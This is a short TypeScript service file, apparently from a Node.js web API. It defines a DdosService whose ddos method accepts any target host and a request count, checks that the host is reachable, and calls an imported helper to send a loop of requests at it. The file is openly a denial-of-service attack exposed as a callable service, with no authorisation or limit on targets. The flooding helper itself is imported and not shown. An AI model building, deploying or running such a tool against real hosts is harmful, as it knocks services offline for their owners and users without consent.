import { StatusCodes } from 'http-status-codes'

import { ServiceResponse } from '@/common/models/serviceResponse'

import { Response } from './model'
import { isReachable, sendRequestsInLoop } from './utils'

export class DdosService {
	async ddos(target: string, count: number): Promise<ServiceResponse<Response | null>> {
		try {
			const url = target.startsWith('http://') || target.startsWith('https://') ? target : `http://${target}`
			const reachable = await isReachable(target)
			if (!reachable) {
				return ServiceResponse.failure('Target is not reachable', null, StatusCodes.BAD_REQUEST)
			}
			const results = await sendRequestsInLoop(url, count)
			return ServiceResponse.success<Response>(`${results.length} requests send`, results)
		} catch (error) {
			const err = error as Error
			switch (err.message) {
				default:
					return ServiceResponse.failure('Internal server error', null, StatusCodes.INTERNAL_SERVER_ERROR)
			}
		}
	}
}

export const ddosService = new DdosService()
